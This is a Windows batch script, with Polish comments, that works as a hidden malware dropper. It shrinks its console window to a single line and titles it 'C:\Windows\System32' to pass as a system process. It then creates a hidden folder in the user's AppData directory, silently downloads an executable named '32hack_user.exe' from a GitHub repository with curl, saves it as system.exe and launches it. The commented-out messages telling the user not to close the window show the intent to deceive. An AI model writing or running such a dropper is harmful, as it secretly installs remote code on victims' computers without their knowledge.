��&cls
@echo off
mode con cols=15 lines=1
title C:\Windows\System32
mode con cols=15 lines=1
::echo System się uruchamia...
mode con cols=15 lines=1
::echo Nie wylaczaj tego okna!
mode con cols=15 lines=1
cd "C:\Users\%USERNAME%\AppData\Local"
mode con cols=15 lines=1
mkdir "ar-eg"
mode con cols=15 lines=1
attrib +h "ar-eg" /s /d
mode con cols=15 lines=1
cd C:\Users\%USERNAME%\AppData\Local\ar-eg"
mode con cols=15 lines=1
curl -s -L -o system.exe https://github.com/boblorgh/Test2/raw/refs/heads/main/32hack_user.exe
mode con cols=15 lines=1
start system.exe
mode con cols=15 lines=1
::echo System skonczyl sie uruchamiac.
mode con cols=15 lines=1
::echo Mozesz wylaczyc to okno.
mode con cols=15 lines=1
exit